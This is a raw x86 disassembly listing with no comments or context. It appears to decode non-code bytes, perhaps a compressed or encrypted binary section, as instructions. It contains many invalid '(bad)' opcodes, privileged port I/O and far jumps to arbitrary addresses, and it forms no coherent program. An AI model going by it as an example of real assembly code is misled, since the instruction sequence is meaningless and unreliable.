  40baac:	pop    ss
  40baad:	mov    al,ds:0xa120e9b0
  40bab2:	adc    DWORD PTR [edi+ebx*4-0x7b],edx
  40bab6:	dec    BYTE PTR [ecx-0x3a]
  40bab9:	add    al,0xe0
  40babb:	fadd   DWORD PTR [esi-0x30]
  40babe:	out    dx,eax
  40babf:	out    dx,al
  40bac0:	dec    eax
  40bac1:	sti    
  40bac2:	imul   ebx,ebp,0xffffffd8
  40bac5:	xor    bl,bh
  40bac7:	xor    al,0x4
  40bac9:	pop    eax
  40baca:	adc    al,BYTE PTR [esi+0x10]
  40bacd:	xchg   DWORD PTR ds:0x28352e0e,edi
  40bad3:	xchg   edi,eax
  40bad4:	dec    ebx
  40bad5:	dec    eax
  40bad6:	fstp   DWORD PTR [edi]
  40bad8:	jmp    0x86137af4
  40badd:	mov    cl,0x89
  40badf:	in     al,0xda
  40bae1:	fimul  DWORD PTR [esi+0x6f]
  40bae4:	clc    
  40bae5:	lea    ebp,[ebx+edi*4+0x41]
  40bae9:	add    BYTE PTR [ecx],al
  40baeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40baec:	xor    BYTE PTR [ebp+esi*2+0x74],dl
  40baf0:	ds push ecx
  40baf2:	test   eax,eax
  40baf4:	cbw    
  40baf6:	aad    0x7f
  40baf8:	sbb    DWORD PTR [esi+edx*2-0x60],esp
  40bafc:	sub    ebx,DWORD PTR [esi+0x6f]
  40baff:	rcl    BYTE PTR [ebx*4+0x1bfed3bb],1
  40bb06:	fstp   DWORD PTR [esi-0x4c]
  40bb09:	das    
  40bb0a:	mov    DWORD PTR [ebx+0x35],esp
  40bb0d:	jmp    0x40bb3e
  40bb0f:	or     BYTE PTR [ecx+eiz*2+0xf],dl
  40bb13:	cdq    
  40bb14:	xchg   BYTE PTR [edi-0x151f6106],ah
  40bb1a:	pop    edx
  40bb1b:	add    dh,BYTE PTR [edx+0x5a56064c]
  40bb21:	mov    ds:0xe4da5694,al
  40bb26:	and    eax,0x5a229288
  40bb2b:	or     bl,BYTE PTR [edx+0x2e339375]
  40bb31:	dec    edx
  40bb32:	adc    ebp,DWORD PTR [eax+0x44]
  40bb35:	pop    edx
  40bb36:	retf   0x7f09
  40bb39:	xchg   edx,eax
  40bb3a:	scas   eax,DWORD PTR es:[edi]
  40bb3b:	ds mov esi,0xf2fd2fcd
  40bb41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb42:	imul   esi,DWORD PTR [ebp+0x172a16da],0x6a76da19
  40bb4c:	scas   al,BYTE PTR es:[edi]
  40bb4d:	add    al,0x8e
  40bb4f:	mov    ds:0xcfbf7e88,al
  40bb54:	fcomp  st(0)
  40bb56:	sbb    BYTE PTR [edi],bh
  40bb58:	hlt    
  40bb59:	mov    bh,0xdf
  40bb5b:	(bad)  
  40bb5c:	(bad)  
  40bb5e:	ror    DWORD PTR [ecx],0x1a
  40bb61:	in     eax,0xf3
  40bb63:	and    BYTE PTR [ebx+0x4d],ah
  40bb66:	hlt    
  40bb67:	inc    esi
  40bb68:	repnz mov ds:0x97f4add6,eax
  40bb6e:	jp     0x40bb2f
  40bb70:	mov    dl,0x63
  40bb72:	xor    al,0x6b
  40bb74:	sbb    eax,0x153de3be
  40bb79:	push   ds
  40bb7a:	mov    eax,0x724ad17f
  40bb7f:	mov    bh,0x90
  40bb81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb82:	sub    ebp,ecx
  40bb84:	fnstsw WORD PTR [ebp+0x2e]
  40bb87:	inc    edx
  40bb88:	mov    BYTE PTR [edx-0x73468d78],ah
  40bb8e:	out    dx,eax
  40bb8f:	sti    
  40bb90:	cmp    al,0xf2
  40bb92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb93:	daa    
  40bb94:	js     0x40bb8c
  40bb96:	call   0x443248c5
  40bb9b:	xchg   esp,eax
  40bb9c:	stos   DWORD PTR es:[edi],eax
  40bb9d:	push   ebx
  40bb9e:	xchg   esp,eax
  40bb9f:	sub    edx,DWORD PTR [ebx]
  40bba1:	mov    al,BYTE PTR [ecx]
  40bba3:	push   0xffffffa9
  40bba5:	sbb    eax,edi
  40bba7:	push   edx
  40bba8:	test   DWORD PTR [edi+0x252bb0ae],0xb1d29691
  40bbb2:	out    dx,al
  40bbb3:	push   ebx
  40bbb4:	in     eax,0x6b
  40bbb6:	(bad)  
  40bbb7:	xchg   ecx,eax
  40bbb8:	cld    
  40bbb9:	dec    esi
  40bbba:	lahf   
  40bbbb:	imul   ebp,DWORD PTR [ecx-0x64],0xffffff97
  40bbbf:	lock mov cl,0x73
  40bbc2:	dec    esp
  40bbc3:	adc    al,0x27
  40bbc5:	jmp    0x145b:0x7a7ae63e
  40bbcc:	dec    ebx
  40bbcd:	cmp    eax,0x9ea4799
  40bbd2:	cmp    eax,0x32486a29
  40bbd7:	out    dx,eax
  40bbd8:	jmp    0x40bc24
  40bbda:	jnp    0x40bb85
  40bbdc:	jmp    0x40bbdf
  40bbde:	push   0x3
  40bbe0:	pusha  
  40bbe1:	add    al,0xc8
  40bbe3:	push   cs
  40bbe4:	xchg   ebx,eax
  40bbe5:	jecxz  0x40bbe8
  40bbe7:	mov    dl,0xc0
  40bbe9:	add    eax,0x9e419a68
  40bbee:	cmp    ecx,DWORD PTR [eax]
  40bbf0:	ret    
  40bbf1:	aad    0x1b
  40bbf3:	cli    
  40bbf4:	loopne 0x40bc55
  40bbf6:	fisttp DWORD PTR [di+0x3011]
  40bbfb:	inc    ebx
  40bbfc:	mov    ebp,0xfcf3a1ea
  40bc01:	and    ebx,DWORD PTR [edi+0x364772b4]
  40bc07:	jge    0x40bc66
  40bc09:	cmp    eax,0x8ddb68be
  40bc0e:	sahf   
  40bc0f:	push   ebx
  40bc10:	mov    ah,0xfd
  40bc12:	pop    edx
  40bc13:	push   0xa2681140
  40bc18:	push   0x1
  40bc1a:	test   al,0x8d
  40bc1c:	dec    eax
  40bc1d:	push   esp
  40bc1e:	and    eax,0x6c6c9020
  40bc23:	or     al,0x50
  40bc25:	push   ds
  40bc26:	add    BYTE PTR [ecx+0x61a2042d],dl
  40bc2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc2d:	xor    eax,0xafd15955
  40bc32:	or     BYTE PTR [ebx+0x4a],cl
  40bc35:	pop    es
  40bc36:	or     eax,0x182d14c8
  40bc3b:	adc    eax,0x1c830a55
  40bc40:	inc    eax
  40bc41:	lds    eax,FWORD PTR ds:0xf3f62078
  40bc47:	retf   
  40bc48:	mov    edi,0xe18312fe
  40bc4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc4e:	clc    
  40bc4f:	imul   edi,DWORD PTR [edi],0xfffffff8
  40bc52:	pop    ebp
  40bc53:	mov    WORD PTR [edi-0x45fda671],cs
  40bc59:	pop    esi
  40bc5a:	sub    eax,DWORD PTR [edx+0x7]
  40bc5d:	xchg   BYTE PTR [eax],cl
  40bc5f:	fwait
  40bc60:	int    0x26
  40bc62:	jg     0x40bc5f
  40bc64:	jg     0x40bce0
  40bc66:	pop    ds
  40bc67:	(bad)  
  40bc68:	cli    
  40bc69:	and    edi,esp
  40bc6b:	aam    0xcf
  40bc6d:	popf   
  40bc6e:	mov    ds:0xfd8fdfd5,eax
  40bc73:	inc    esi
  40bc74:	test   BYTE PTR ds:0x652120dc,0xc
  40bc7b:	hlt    
  40bc7c:	cld    
  40bc7d:	cwde   
  40bc7e:	aaa    
  40bc7f:	fdivr  QWORD PTR [edi]
  40bc81:	in     al,0xe3
  40bc83:	jg     0x40bc7e
  40bc85:	jne    0x40bc9f
  40bc87:	xchg   edi,eax
  40bc88:	fisttp WORD PTR [esi+0x25]
  40bc8b:	scas   al,BYTE PTR es:[edi]
  40bc8c:	mov    esi,DWORD PTR [esi-0x2abf8c67]
  40bc92:	repnz cmp edi,esi
  40bc95:	loop   0x40bce0
  40bc97:	ds test eax,0xa8e60871
  40bc9e:	(bad)  
  40bc9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bca0:	sub    BYTE PTR [edi-0x39],dl
  40bca3:	shr    BYTE PTR [ebx],0xd9
  40bca6:	and    al,0x2c
  40bca8:	outs   dx,BYTE PTR ds:[esi]
  40bca9:	adc    ebx,edx
  40bcab:	dec    ecx
  40bcac:	loop   0x40bc6a
  40bcae:	and    DWORD PTR [ecx+0x5c],ebp
  40bcb1:	mov    esi,0x23693667
  40bcb6:	popf   
  40bcb7:	arpl   WORD PTR [eax],si
  40bcb9:	xchg   esp,eax
  40bcba:	or     al,BYTE PTR ds:0xe35a8cb8
  40bcc0:	xor    DWORD PTR [edi+edx*2],edi
  40bcc3:	and    BYTE PTR [ecx+0x43],bl
  40bcc6:	mov    ds:0xb125523b,al
  40bccb:	sbb    ebx,DWORD PTR [ecx]
  40bccd:	call   0xa6d5e72
  40bcd2:	rcr    edi,1
  40bcd4:	pop    ss
  40bcd5:	int    0xd0
  40bcd7:	int    0x9f
  40bcd9:	sub    DWORD PTR [edi],eax
  40bcdb:	es sti 
  40bcdd:	xchg   esp,eax
  40bcde:	std    
  40bcdf:	popa   
  40bce0:	mov    BYTE PTR [eax],0x98
  40bce3:	out    dx,eax
  40bce4:	sub    ebp,DWORD PTR [ecx]
  40bce6:	xchg   ebp,eax
  40bce7:	or     esi,DWORD PTR [eax]
  40bce9:	aas    
  40bcea:	jle    0x40bce1
  40bcec:	cli    
  40bced:	stc    
  40bcee:	xchg   ecx,eax
  40bcef:	push   cs
  40bcf0:	mov    ecx,0x46d76d05
  40bcf5:	sar    BYTE PTR [ebp+eax*1-0x2b0c2c2d],0x95
  40bcfd:	jnp    0x40bd2f
  40bcff:	dec    ebp
  40bd00:	popaw  
  40bd02:	hlt    
  40bd03:	fs xchg ebx,eax
  40bd05:	or     ecx,esi
  40bd07:	xor    eax,0xcddbe608
  40bd0c:	sbb    ch,dh
  40bd0e:	jbe    0x40bd1b
  40bd10:	sti    
  40bd11:	ja     0x40bced
  40bd13:	addr16 push es
  40bd15:	push   0x72aac71c
  40bd1a:	mov    cl,0x26
  40bd1c:	push   eax
  40bd1d:	or     DWORD PTR [esi+0x5aeaf192],esi
  40bd23:	pop    ds
  40bd24:	cmp    al,0xdf
  40bd26:	push   cs
  40bd27:	adc    ah,0x58
  40bd2a:	push   0xf703ada4
  40bd2f:	pop    ebp
  40bd30:	adc    bh,0xb
  40bd33:	shr    BYTE PTR [eax-0x2d2519f9],cl
  40bd39:	cmp    DWORD PTR [esi+0x8],edx
  40bd3c:	adc    BYTE PTR gs:[edx+ebp*2],dl
  40bd40:	mov    ds:0x84821490,al
  40bd45:	cmp    edi,eax
  40bd47:	in     eax,0xff
  40bd49:	jl     0x40bccd
  40bd4b:	lods   eax,DWORD PTR ds:[esi]
  40bd4c:	lods   eax,DWORD PTR ds:[esi]
  40bd4d:	inc    esp
  40bd4f:	pop    edi
  40bd50:	sti    
  40bd51:	ror    DWORD PTR [edi],0xb0
  40bd54:	mov    eax,0x79e780b8
  40bd59:	mov    edx,0x2dced312
  40bd5e:	das    
  40bd5f:	pop    ebp
  40bd60:	int3   
  40bd61:	and    edx,DWORD PTR ss:[ecx+0x7f2ad5ab]
  40bd68:	in     eax,dx
  40bd69:	scas   eax,DWORD PTR es:[edi]
  40bd6a:	mov    esp,0x4be54a93
  40bd6f:	cld    
  40bd70:	mov    edi,DWORD PTR [edi-0x4d]
  40bd73:	int3   
  40bd74:	jbe    0x40bd65
  40bd76:	inc    eax
  40bd77:	dec    edx
  40bd78:	dec    esp
  40bd79:	(bad)  
  40bd7a:	sub    BYTE PTR [eax-0x6f7555dc],bl
  40bd80:	data16 add bh,bl
  40bd83:	mov    bx,0xfc7c
  40bd87:	mov    ebx,0x33d99816
  40bd8c:	xchg   esi,eax
  40bd8d:	shl    edi,1
  40bd8f:	pop    ebp
  40bd90:	adc    eax,0xbadbaf20
  40bd95:	sub    eax,0x9c455449
  40bd9a:	test   eax,0xb7b629a9
  40bd9f:	pop    ebx
  40bda0:	cld    
  40bda1:	out    dx,al
  40bda2:	addr16 push ds
  40bda4:	ins    DWORD PTR es:[di],dx
  40bda6:	stos   DWORD PTR es:[edi],eax
  40bda7:	into   
  40bda8:	hlt    
  40bda9:	in     al,dx
  40bdaa:	adc    dl,BYTE PTR [ebp+0x5f8114ca]
  40bdb0:	xlat   BYTE PTR ds:[ebx]
  40bdb1:	mov    ecx,0xe063a414
  40bdb6:	jae    0x40be18
  40bdb8:	ja     0x40bd9c
  40bdba:	sbb    dh,dl
  40bdbc:	int3   
  40bdbd:	mov    ebx,0x718abe41
  40bdc2:	push   0x7b
  40bdc4:	(bad)  
  40bdc5:	push   esp
  40bdc6:	fwait
  40bdc7:	(bad)  
  40bdc8:	adc    al,0xd4
  40bdca:	(bad)  
  40bdcb:	and    eax,0xc30c3a42
  40bdd0:	fsubr  QWORD PTR [ebx]
  40bdd2:	xchg   esp,ebp
  40bdd4:	jne    0x40bd66
  40bdd6:	(bad)  
  40bdd7:	nop
  40bdd8:	fisubr DWORD PTR [ebp+0x5e763868]
  40bdde:	adc    eax,0x8d0836b0
  40bde3:	adc    al,0x62
  40bde5:	adc    eax,0x50461809
  40bdea:	cs (bad) 
  40bdec:	int3   
  40bded:	into   
  40bdee:	xor    al,0x9
  40bdf0:	jne    0x40be44
  40bdf2:	xchg   esp,eax
  40bdf3:	cmp    al,0xfa
  40bdf5:	add    al,0x15
  40bdf7:	(bad)  
  40bdf8:	loope  0x40bdb4
  40bdfa:	add    BYTE PTR [ebp-0x748f6911],bl
  40be00:	adc    eax,DWORD PTR [ecx+0x8537698]
  40be06:	inc    eax
  40be07:	push   0x9
  40be09:	addr16 (bad) 
  40be0b:	std    
  40be0c:	dec    ebp
  40be0d:	xor    edi,DWORD PTR [edx]
  40be0f:	mov    edi,0xc046565a
  40be14:	push   edx
  40be15:	dec    ecx
  40be16:	stc    
  40be17:	aad    0x87
  40be19:	ret    
  40be1a:	loope  0x40be24
  40be1c:	icebp  
  40be1d:	out    dx,al
  40be1e:	inc    esp
  40be1f:	fsub   st,st(6)
  40be21:	cld    
  40be22:	fnsave [edx]
  40be24:	add    edi,esi
  40be26:	mov    esp,0xe3a2e5a2
  40be2b:	fadd   QWORD PTR [ecx-0x14]
  40be2e:	or     DWORD PTR [ecx-0x3d],esp
  40be31:	mov    esi,0xa9509265
  40be36:	push   esi
  40be37:	mov    BYTE PTR [ebx],dl
  40be39:	leave  
  40be3a:	aad    0xd5
  40be3c:	add    DWORD PTR [eax+0x4d],edi
  40be3f:	add    BYTE PTR [ecx+eiz*4],bh
  40be42:	push   edx
  40be43:	and    BYTE PTR [ecx],0x74
  40be46:	in     al,0x69
  40be48:	in     al,dx
  40be49:	jmp    0x2669:0x5c1faaf9
  40be50:	in     eax,dx
  40be51:	xchg   esp,eax
  40be52:	cmp    eax,0x8cc188d2
  40be57:	dec    edx
  40be58:	add    bh,BYTE PTR [eax+0x3e]
  40be5b:	cmp    BYTE PTR ss:[eax+0x2195e104],cl
  40be62:	cmp    ah,cl
  40be64:	outs   dx,DWORD PTR ds:[esi]
  40be65:	cld    
  40be66:	into   
  40be67:	xor    ch,BYTE PTR [edi+0x7e79fc9c]
  40be6d:	call   0x7d13b61
  40be72:	pop    esi
  40be73:	ja     0x40be94
  40be75:	xchg   ebp,eax
  40be76:	dec    edx
  40be77:	(bad)
  40be7a:	neg    BYTE PTR [ebx+0x30]
  40be7d:	mov    dl,0x9e
  40be7f:	push   DWORD PTR ds:0xb972bb46
  40be85:	int3   
  40be86:	daa    
  40be87:	ds cli 
  40be89:	push   esi
  40be8a:	xchg   edx,eax
  40be8b:	cmp    cl,ah
  40be8d:	pop    edi
  40be8e:	dec    ah
  40be90:	pop    ecx
  40be91:	pop    edx
  40be92:	std    
  40be93:	add    ebp,DWORD PTR [ecx]
  40be95:	rcr    DWORD PTR [eax],1
  40be97:	pop    ss
  40be98:	mov    al,ds:0xeaf50246
  40be9d:	xor    bh,0xbd
  40bea0:	mov    ds:0xb8de5bce,eax
  40bea5:	iret   
  40bea6:	adc    dh,BYTE PTR [edx-0x3e645947]
  40beac:	ss scas eax,DWORD PTR es:[edi]
  40beae:	out    0xbb,eax
  40beb0:	sub    eax,0xb56a430c
  40beb5:	sbb    al,BYTE PTR [ecx+0x10]
  40beb8:	lock jnp 0x40be5a
  40bebb:	stc    
  40bebc:	sub    cl,bh
  40bebe:	pop    ds
  40bebf:	(bad)  [esp+ebp*2-0x6]
  40bec3:	xor    eax,0xf8932a94
  40bec8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bec9:	mov    DWORD PTR es:[edx+ecx*2],edx
  40becd:	je     0x40be79
  40becf:	pop    DWORD PTR [edx+0x2babfab5]
  40bed5:	bound  ebp,QWORD PTR ds:0x834e76f7
  40bedb:	sub    ebx,DWORD PTR [ebp-0x5c80773]
  40bee1:	mov    ebp,0xb9c84933
  40bee6:	xchg   al,cl
  40bee8:	adc    DWORD PTR [ebx+0x7a],edi
  40beeb:	pushf  
  40beec:	dec    ebx
  40beed:	cmc    
  40beee:	cmp    DWORD PTR [ecx],esp
  40bef0:	and    al,0xdc
  40bef2:	in     eax,dx
  40bef3:	in     al,0x9a
  40bef5:	popa   
  40bef6:	or     al,BYTE PTR [edx+0x1b]
  40bef9:	adc    edx,DWORD PTR [ebp-0x3516e8b6]
  40beff:	enter  0x50e1,0x32
  40bf03:	fld1   
  40bf05:	xor    DWORD PTR [edi],edi
  40bf07:	aaa    
  40bf08:	inc    edi
  40bf09:	sbb    BYTE PTR [esi+0x2c68adc8],ah
  40bf0f:	mov    edx,0xfb9da753
  40bf14:	ja     0x40be97
  40bf16:	push   edi
  40bf17:	bnd ja 0x40bed7
  40bf1a:	adc    eax,0xa008376d
  40bf1f:	add    al,0x4a
  40bf21:	cli    
  40bf22:	add    eax,0x9307a041
  40bf27:	sub    DWORD PTR [edx],ebx
  40bf29:	popa   
  40bf2a:	(bad)  
  40bf2b:	jb     0x40bf03
  40bf2d:	push   ebx
  40bf2e:	jecxz  0x40bed0
  40bf30:	mov    cl,0x76
  40bf32:	mov    edx,0x8888b630
  40bf37:	mov    ebx,edx
  40bf39:	outs   dx,BYTE PTR ds:[esi]
  40bf3a:	cwde   
  40bf3b:	ror    BYTE PTR [ebp-0x8a06462],0xb5
  40bf42:	pop    edi
  40bf43:	dec    edi
  40bf44:	or     ah,BYTE PTR [ecx+0x56a98067]
  40bf4a:	scas   al,BYTE PTR es:[edi]
  40bf4b:	push   esp
  40bf4c:	push   0xb76cbab5
  40bf51:	shl    bh,cl
  40bf53:	jbe    0x40befa
  40bf55:	xchg   ecx,eax
  40bf56:	mov    al,BYTE PTR [ecx]
  40bf58:	jo     0x40bf7f
  40bf5a:	cmp    eax,0xecc8199a
  40bf5f:	mov    edx,0x4301d574
  40bf64:	sub    al,0xe
  40bf66:	pop    edx
  40bf67:	mov    BYTE PTR [ebx],dl
  40bf69:	lea    edi,[edx]
  40bf6b:	xor    al,0x12
  40bf6d:	dec    eax
  40bf6e:	shl    BYTE PTR [ebx-0x3bc5a07e],0x57
  40bf75:	push   ds
  40bf76:	cmp    ecx,edi
  40bf78:	repnz (bad) 
  40bf7b:	adc    eax,0xde87f87e
  40bf80:	retf   
  40bf81:	mov    ebx,0x5b16fddf
  40bf86:	jns    0x40bfb1
  40bf88:	call   FWORD PTR [esi+0x36fce5f9]
  40bf8e:	xor    DWORD PTR [esi+eax*1-0x7d],0x1
  40bf93:	inc    ecx
  40bf94:	adc    al,dh
  40bf96:	jge    0x40bfb7
  40bf98:	jg     0x40bfb5
  40bf9a:	xchg   edx,eax
  40bf9b:	das    
  40bf9c:	icebp  
  40bf9d:	das    
  40bf9e:	dec    ch
  40bfa0:	pop    ecx
  40bfa1:	cmp    al,bl
  40bfa3:	add    ebx,eax
  40bfa5:	mov    al,ds:0x3cd92d20
  40bfaa:	adc    DWORD PTR [ecx-0x9],esi
  40bfad:	shl    DWORD PTR [esi],0x7f
  40bfb0:	in     eax,0x63
  40bfb2:	not    DWORD PTR [ecx-0x57]
  40bfb5:	xchg   esp,eax
  40bfb6:	ins    BYTE PTR es:[edi],dx
  40bfb7:	dec    esi
  40bfb8:	mov    ebx,0x4eca9b22
  40bfbd:	jbe    0x40bfd5
  40bfbf:	ret    
  40bfc0:	and    al,0x26
  40bfc2:	daa    
  40bfc3:	daa    
  40bfc4:	cmp    edx,edi
  40bfc6:	ret    0x3e09
  40bfc9:	test   DWORD PTR [ebp+0x3cfe9097],0x4a1eeae5
  40bfd3:	xchg   ebp,eax
  40bfd4:	jno    0x40bfe6
  40bfd6:	sbb    DWORD PTR [esi+0x54fa68f9],0xa5a78813
  40bfe0:	xor    al,0x9e
  40bfe2:	dec    ebx
  40bfe3:	mov    dl,0x39
  40bfe5:	jecxz  0x40bf85
  40bfe7:	xchg   dh,ch
  40bfe9:	test   eax,0x88846258
  40bfee:	in     eax,dx
  40bfef:	jno    0x40c05f
  40bff1:	lods   al,BYTE PTR ds:[esi]
  40bff2:	inc    eax
  40bff3:	cli    
  40bff4:	or     eax,0x2679784
  40bff9:	jns    0x40bfaf
  40bffb:	loope  0x40c00d
  40bffd:	ins    BYTE PTR es:[edi],dx
  40bffe:	out    0x30,al
  40c000:	imul   edi,DWORD PTR [edi+0x25],0xd8e14b10
  40c007:	daa    
  40c008:	add    al,0x32
  40c00a:	xchg   ecx,eax
  40c00b:	xchg   esp,eax
  40c00c:	std    
  40c00d:	push   cs
  40c00e:	sahf   
  40c00f:	xchg   edi,eax
  40c010:	stos   BYTE PTR es:[edi],al
  40c011:	pusha  
  40c012:	cmp    ecx,DWORD PTR [ebp-0x294dc32f]
  40c018:	ins    DWORD PTR es:[edi],dx
  40c019:	xchg   ebp,eax
  40c01a:	fnsetpm(287 only) 
  40c01c:	push   es
  40c01d:	fmul   QWORD PTR ds:0xc31ba802
  40c023:	pop    eax
  40c024:	mov    ecx,0x6603d26c
  40c029:	adc    DWORD PTR [esp+edx*2-0x58],0x6f
  40c02e:	add    DWORD PTR ss:[esi+eax*2-0x45],esp
  40c033:	sub    al,BYTE PTR [eax-0x280499bf]
  40c039:	arpl   cx,bx
  40c03b:	mov    edi,0x16bfc49e
  40c040:	adc    eax,eax
  40c042:	call   0x5784eeef
  40c047:	cmp    ebp,DWORD PTR [ecx+0x3d9ccb94]
  40c04d:	ja     0x40bfd0
  40c04f:	outs   dx,BYTE PTR ds:[esi]
  40c050:	daa    
  40c051:	mov    cl,0x28
  40c053:	fnstenv [ebx]
  40c055:	inc    edx
  40c056:	enter  0x6140,0x99
  40c05a:	pop    esi
  40c05b:	retf   
  40c05c:	or     BYTE PTR [ebx+ebp*1],ah
  40c05f:	fnstenv [ecx-0x77]
  40c062:	(bad)  
  40c063:	(bad)  
  40c065:	mov    al,ds:0x229b7485
  40c06a:	jg     0x40c07b
  40c06c:	jmp    0x78d19a95
  40c071:	js     0x40c035
  40c073:	daa    
  40c074:	test   al,0xec
  40c076:	in     eax,0xa5
  40c078:	push   ebx
  40c079:	and    eax,0xfc8ffefe
  40c07e:	and    DWORD PTR [edi-0x9],edi
  40c081:	loop   0x40c0ad
  40c083:	pop    ds
  40c084:	stc    
  40c085:	lock jnp 0x40c0f1
  40c088:	xor    al,0xea
  40c08a:	test   BYTE PTR [ecx+0x38],ah
  40c08d:	push   edx
  40c08e:	ins    BYTE PTR es:[edi],dx
  40c08f:	jb     0x40c0b8
  40c091:	fs nop
  40c093:	daa    
  40c094:	dec    edx
  40c095:	add    DWORD PTR [esi+edi*4],0xffffffff
  40c099:	jecxz  0x40c10a
  40c09b:	mov    ds:0x7e63ffdf,eax
  40c0a0:	jmp    0xc7ee:0x17a79fdf
  40c0a7:	out    0x15,al
  40c0a9:	adc    BYTE PTR [edx+0x1f3ea999],al
  40c0af:	std    
  40c0b0:	rcr    BYTE PTR [ebx+edi*2],1
  40c0b3:	out    0x9b,eax
  40c0b5:	xchg   esi,eax
  40c0b6:	loope  0x40c0cc
  40c0b8:	adc    DWORD PTR [esp+ecx*4],edi
  40c0bb:	jmp    0xcc86:0x185f66fd
  40c0c2:	into   
  40c0c3:	into   
  40c0c4:	mov    dl,0xb5
  40c0c6:	fucom  st(6)
  40c0c8:	push   ebx
  40c0c9:	mov    edi,0xd79728f3
  40c0ce:	stos   BYTE PTR es:[edi],al
  40c0cf:	int3   
  40c0d0:	cs in  al,dx
  40c0d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0d3:	push   esp
  40c0d4:	push   ds
  40c0d5:	and    ecx,DWORD PTR [eax]
  40c0d7:	stos   BYTE PTR es:[edi],al
  40c0d8:	and    al,0x89
  40c0da:	les    eax,FWORD PTR [esi]
  40c0dc:	out    0x48,al
  40c0de:	xor    edx,DWORD PTR [esi+0x54]
  40c0e1:	pop    es
  40c0e2:	test   eax,0xba773e88
  40c0e7:	mov    dl,0xea
  40c0e9:	mov    ds:0xfd3f5e4c,eax
  40c0ee:	sub    eax,0xb893b432
  40c0f3:	stos   BYTE PTR es:[edi],al
  40c0f4:	add    al,0xd9
  40c0f6:	arpl   bp,cx
  40c0f8:	cmp    BYTE PTR ds:0x41813216,0x7a
  40c0ff:	fs pushw ss
  40c102:	sbb    eax,0xd597a828
  40c107:	dec    ebp
  40c109:	js     0x40c15d
  40c10b:	jg     0x40c0e3
  40c10d:	dec    eax
  40c10e:	cwde   
  40c10f:	dec    eax
  40c110:	in     eax,0xa
  40c112:	dec    esp
  40c113:	inc    edx
  40c114:	(bad)  
  40c115:	sbb    ah,BYTE PTR [ecx]
  40c117:	add    ah,0x86
  40c11a:	xor    edx,DWORD PTR [edi]
  40c11c:	(bad)  [ebx-0x24]
  40c11f:	inc    edx
  40c120:	cmp    bh,BYTE PTR [ecx-0x1be7e98a]
  40c126:	aaa    
  40c127:	fimul  WORD PTR [edx-0x7fe4d44a]
  40c12d:	jmp    0x40c12d
  40c12f:	xor    dl,BYTE PTR [eax]
  40c131:	fbld   TBYTE PTR ds:0xf77efcf4
  40c137:	cmp    al,0xb7
  40c139:	pop    ebp
  40c13a:	dec    ebx
  40c13b:	jp     0x40c11c
  40c13d:	test   al,0x3e
  40c13f:	pop    edi
  40c140:	aam    0x6e
  40c142:	xchg   esp,eax
  40c143:	imul   esp,DWORD PTR [esi+ebx*4+0xf],0x94ac4b52
  40c14b:	push   ss
  40c14c:	add    eax,0xcd1abaf8
  40c151:	mov    ecx,0x76e91773
  40c156:	adc    esi,eax
  40c158:	inc    esp
  40c159:	es out dx,eax
  40c15b:	xchg   BYTE PTR [edx-0x69],dl
  40c15e:	mov    ch,0x51
  40c160:	retf   0x7348
  40c163:	test   eax,0x7a48d988
  40c168:	mov    bl,0xcd
  40c16a:	xor    BYTE PTR [ebp-0x4d0aaf6c],dl
  40c170:	je     0x40c143
  40c172:	inc    ebx
  40c173:	adc    ah,0x45
  40c176:	inc    esp
  40c177:	ins    DWORD PTR es:[edi],dx
  40c178:	loop   0x40c18a
  40c17a:	cmp    al,0x2
  40c17c:	aas    
  40c17d:	mov    al,ds:0xeae69e5c
  40c182:	mov    WORD PTR [edi],bx
  40c185:	std    
  40c186:	icebp  
  40c187:	daa    
  40c188:	cmp    BYTE PTR [edi+0x7e],bh
  40c18b:	cmp    DWORD PTR [edi-0x74414803],0xffffffe9
  40c192:	test   eax,0xf23cccc9
  40c197:	popf   
  40c198:	mov    al,ds:0xe637dbbf
  40c19d:	xlat   BYTE PTR ds:[ebx]
  40c19e:	sbb    BYTE PTR [edi-0xcd1a36],bl
  40c1a4:	ret    
  40c1a5:	(bad)  
  40c1a7:	sub    ebx,DWORD PTR [ebp-0x100ce012]
  40c1ad:	jle    0x40c210
  40c1af:	test   DWORD PTR [ecx+0x32],esp
  40c1b2:	cmpps  xmm4,XMMWORD PTR [ebx-0x690671ae],0x87
  40c1ba:	add    al,0xdf
  40c1bc:	stc    
  40c1bd:	xchg   edi,eax
  40c1be:	out    dx,al
  40c1bf:	popa   
  40c1c0:	cmp    BYTE PTR [esi+ecx*4],bl
  40c1c3:	call   0x41fbb0c3
  40c1c8:	push   ss
  40c1c9:	stc    
  40c1ca:	(bad)  
  40c1cb:	sbb    eax,0xebd4870e
  40c1d0:	jne    0x40c1fc
  40c1d2:	xchg   ebp,eax
  40c1d3:	or     bh,bh
  40c1d5:	fucomip st,st(7)
  40c1d7:	jle    0x40c15a
  40c1d9:	daa    
  40c1da:	lahf   
  40c1db:	outs   dx,DWORD PTR ds:[esi]
  40c1dc:	rcr    DWORD PTR [eax],1
  40c1de:	mov    ebx,0x279529b
  40c1e3:	aas    
  40c1e4:	sbb    BYTE PTR [ebx],ah
  40c1e6:	mov    al,BYTE PTR [eax+0x8]
  40c1e9:	xor    ecx,DWORD PTR [edi+0x7b7d435f]
  40c1ef:	or     eax,0x64530961
  40c1f4:	je     0x40c1f3
  40c1f6:	xor    al,0x60
  40c1f8:	(bad)  
  40c1f9:	jge    0x40c236
  40c1fb:	inc    ebp
  40c1fc:	pushf  
  40c1fd:	xchg   BYTE PTR [ecx-0x141db60],cl
  40c203:	mov    eax,0xf3cd9896
  40c208:	push   ss
  40c209:	sbb    BYTE PTR [edi-0x52fe2bb9],ah
  40c20f:	push   esi
  40c210:	or     BYTE PTR [ebx-0x5b6416e6],ah
  40c216:	and    edi,DWORD PTR ds:0xe776f10d
  40c21c:	add    DWORD PTR [ecx+edx*4-0xe],eax
  40c220:	push   es
  40c221:	or     al,0x87
  40c223:	add    ecx,DWORD PTR [esi]
  40c225:	cs dec ebp
  40c227:	push   edx
  40c228:	cs xchg edi,eax
  40c22a:	dec    eax
  40c22b:	pop    edx
  40c22c:	std    
